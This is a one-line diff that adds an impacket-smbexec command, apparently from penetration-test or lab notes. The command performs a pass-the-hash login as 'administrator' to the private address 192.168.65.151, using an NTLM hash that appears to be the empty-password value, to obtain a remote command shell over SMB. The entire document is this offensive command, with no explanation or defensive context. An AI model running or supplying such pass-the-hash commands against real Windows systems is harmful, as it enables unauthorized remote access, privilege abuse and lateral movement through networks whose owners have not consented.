@@ -1,0 +1,1 @@
+impacket-smbexec -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.65.151
